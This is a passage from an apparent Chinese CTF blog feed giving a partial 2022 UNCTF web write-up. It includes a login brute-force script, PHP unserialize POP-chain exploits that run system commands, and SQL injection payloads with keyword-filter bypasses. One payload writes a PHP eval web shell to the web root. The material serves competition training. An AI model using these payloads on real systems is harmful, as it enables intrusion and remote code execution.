class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;refresh: 0;url=/showImage.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>极客大挑战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022_UNCTF</title>
    <link href="/2023/01/10/2022-UNCTF/"/>
    <url>/2023/01/10/2022-UNCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-UNCTF部分WP"><a href="#2022-UNCTF部分WP" class="headerlink" title="2022 UNCTF部分WP"></a>2022 UNCTF部分WP</h1><blockquote><p>队名：╰(￣ω￣ｏ)    </p><p>分数 2644 </p><p>排名 16&#x2F;830</p></blockquote><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到-吉林警察学院"><a href="#签到-吉林警察学院" class="headerlink" title="签到-吉林警察学院"></a>签到-吉林警察学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744843.png" alt="image-20221118210612900"></p><p>源码给了个账号密码，</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744844.png" alt="image-20221112133913174"></p><p>不是sql注入。发现输入20200102时，回显了一个f</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744845.png" alt="image-20221112133958673"></p><p>跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8/gbk</span><br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://333f6826-f781-43f2-9be2-e964607ce7f7.node.yuzhian.com.cn:80/index.php&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://333f6826-f781-43f2-9be2-e964607ce7f7.node.yuzhian.com.cn&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://333f6826-f781-43f2-9be2-e964607ce7f7.node.yuzhian.com.cn/index.php&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">50</span>):<br><span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">10</span>:<br>username=<span class="hljs-string">&quot;2020010%d&quot;</span>%i<br><span class="hljs-keyword">else</span>:<br>username = <span class="hljs-string">&quot;202001%d&quot;</span> % i<br>burp0_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:username, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;20200101&quot;</span>, <span class="hljs-string">&quot;submit&quot;</span>: <span class="hljs-string">&quot;\xe6\x8f\x90\xe4\xba\xa4\xe6\x9f\xa5\xe8\xaf\xa2&quot;</span>&#125;<br>re=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)<br><span class="hljs-comment"># print(re.text)</span><br><span class="hljs-comment"># break</span><br><span class="hljs-keyword">if</span> parse.quote(re.text).replace(<span class="hljs-string">&quot;%0D%0A&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[-<span class="hljs-number">2</span>:] == <span class="hljs-string">&quot;7B&quot;</span>:<br>flag+=<span class="hljs-string">&quot;&#123;&quot;</span><br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">if</span> parse.quote(re.text).replace(<span class="hljs-string">&quot;%0D%0A&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[-<span class="hljs-number">2</span>:] == <span class="hljs-string">&quot;7D&quot;</span>:<br>flag+=<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-keyword">break</span><br>flag+=parse.quote(re.text).replace(<span class="hljs-string">&quot;%0D%0A&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)[-<span class="hljs-number">1</span>]<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="ezunseri-西华大学"><a href="#ezunseri-西华大学" class="headerlink" title="ezunseri-西华大学"></a>ezunseri-西华大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744846.png" alt="image-20221119102049019"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;content);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;content;<br>       <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$this</span>-&gt;content);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;1!5!&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-string">&quot;test123&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable language_">$this</span>-&gt;test;<br>        <span class="hljs-variable">$name</span>();<br>    &#125;<br><br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Login</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot; JUST FOR FUN&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;UNCTF&quot;</span></span>)</span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-variable language_">$this</span>-&gt;code;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&#x27;3.1415926&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;key-&gt;name;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[pop]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <br>   <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Login</span>();<br>   <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>&#125; <br></code></pre></td></tr></table></figure><p>链子:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">Login::<span class="hljs-title function_ invoke__">s__destruct</span>()--<span class="hljs-punctuation">-&gt;</span>Exec::__get()--<span class="hljs-punctuation">-&gt;</span>Test::__toString()--<span class="hljs-punctuation">-&gt;</span>Exec::<span class="hljs-title function_ invoke__">invoke</span>()--<span class="hljs-punctuation">-&gt;</span>Exec::<span class="hljs-title function_ invoke__">execute</span>()<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-comment">// public function execute($var)&#123;</span><br>    <span class="hljs-comment">//     eval($this-&gt;content);</span><br>    <span class="hljs-comment">// &#125;</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$n</span></span>)</span>&#123;<br>        <br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$n</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// public function __get($name)&#123;</span><br><br>    <span class="hljs-comment">//     echo $this-&gt;content;</span><br>       <br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __invoke()&#123;</span><br>    <span class="hljs-comment">//     $content = $this-&gt;execute($this-&gt;content);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __wakeup()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;content = &quot;&quot;;</span><br>    <span class="hljs-comment">//     die(&quot;1!5!&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-comment">// public function __construct()&#123;</span><br>        <br>    <span class="hljs-comment">//     $this-&gt;test = &quot;test123&quot;;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __toString()&#123;</span><br>    <span class="hljs-comment">//     $name = $this-&gt;test;</span><br>    <span class="hljs-comment">//     $name();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Login</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-comment">// public function __construct($name=&quot;UNCTF&quot;)&#123;</span><br><br>    <span class="hljs-comment">//     $this-&gt;name = $name;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function show()&#123;</span><br><br>    <span class="hljs-comment">//     echo $this-&gt;name.$this-&gt;code;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// public function __destruct()&#123;</span><br><br>    <span class="hljs-comment">//     if($this-&gt;code = &#x27;3.1415926&#x27;)&#123;</span><br>    <span class="hljs-comment">//         return $this-&gt;key-&gt;name;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-variable">$tes</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$tes</span>-&gt;test=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Exec</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br><br><br><span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Login</span>();<br><span class="hljs-variable">$log</span>-&gt;key=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Exec</span>(<span class="hljs-variable">$tes</span>);<br><br><br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;Exec\&quot;:1&quot;</span>,<span class="hljs-string">&quot;Exec\&quot;:2&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$log</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744847.png" alt="image-20221112141906660"></p><h2 id="随便注-云南警官学院"><a href="#随便注-云南警官学院" class="headerlink" title="随便注-云南警官学院"></a>随便注-云南警官学院</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744848.png" alt="image-20221119102107866"></p><p>回显被隐藏了，用bp打的。</p><p>关键字替换为空，双写绕过，没有information_schema表，用mysql.innodb_table_stats代替，再无列名注入</p><p>过滤了：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span>,<span class="hljs-keyword">where</span>,<span class="hljs-keyword">from</span>,<span class="hljs-keyword">use</span>，<span class="hljs-keyword">update</span>，<span class="hljs-keyword">or</span>，<span class="hljs-keyword">and</span>，<span class="hljs-keyword">order</span>，<span class="hljs-keyword">show</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;union+selselectect+<span class="hljs-number">1</span>,database();<span class="hljs-comment">%00 </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744850.png" alt="image-20221112145636027"></p><p>得到信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">database</span>:admin<br><br><span class="hljs-attribute">version</span>:<span class="hljs-number">10</span>.<span class="hljs-number">4</span>.<span class="hljs-number">13</span>-MariaDB<br><br><span class="hljs-attribute">FLAG_TABLE</span>,news,users<br><br><span class="hljs-attribute">ctftraining</span>,mysql<br></code></pre></td></tr></table></figure><p>查表</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">?id=<span class="hljs-string">0&#x27;u</span>nion+selselectect+<span class="hljs-number">5</span>,(selselectect+group_concat(<span class="hljs-string">`1`</span>)+frfromom+(selselectect+<span class="hljs-number">1</span>+union+seleselectct+*+frfromom<span class="hljs-comment">/**/</span>ctftraining.<span class="hljs-symbol">FLAG_TABLE</span>)a);<span class="hljs-comment">%00</span><br><br></code></pre></td></tr></table></figure><p>flag不在表内</p><p>写马</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?id=<span class="hljs-number">0</span>&#x27;union+selselectect+5,0x3c3f<span class="hljs-number">70687020657661</span>6c<span class="hljs-number">2824</span>5f504f<span class="hljs-number">5354</span>5b636d645d293b3f3e+into+dumpfile+&quot;/var/www/html/shell.php&quot;;%00<br></code></pre></td></tr></table></figure><p>flag在根目录。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744851.png" alt="image-20221112205821555"></p><h2 id="poppop-中国人民公安大学"><a href="#poppop-中国人民公安大学" class="headerlink" title="poppop-中国人民公安大学"></a>poppop-中国人民公安大学</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301101744852.png" alt="image-20221119102119802"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;key;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;key2-&gt;<span class="hljs-title function_ invoke__">abab</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">// function __call($method,$args)&#123;</span><br>    <span class="hljs-comment">//     eval($this-&gt;code);</span><br><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// function __wakeup()&#123;</span><br>    <span class="hljs-comment">//     $this-&gt;code = &quot;&quot;;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">// function __destruct()&#123;</span><br>    <span class="hljs-comment">//     echo $this-&gt;key;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$key2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key2=<span class="hljs-variable">$a</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// function __toString()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     return $this-&gt;key2-&gt;abab();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125; <br><span class="hljs-variable">$a1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$a1</span>-&gt;code=<span class="hljs-string">&quot;phpinfo();&quot;</span>;<br><br><span class="hljs-variable">$c1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$a1</span>);<br><br><br><span class="hljs-variable">$b1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$b1</span>-&gt;key=<span class="hljs-variable">$c1</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ 